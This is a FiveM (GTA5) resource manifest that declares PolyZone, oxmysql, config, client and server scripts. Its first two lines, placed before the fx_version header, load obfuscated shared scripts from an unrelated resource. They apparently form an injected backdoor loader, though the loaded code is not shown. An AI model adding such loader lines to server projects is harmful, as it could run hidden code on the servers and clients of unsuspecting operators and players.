shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

fx_version 'cerulean'
games      { 'gta5' }
shared_scripts {
	'config.lua',
}
client_scripts{
	'@PolyZone/client.lua',
    '@PolyZone/CircleZone.lua',
	'client/*.lua'
} 
server_scripts{
	'@oxmysql/lib/MySQL.lua',
	'server/*.lua'
} 
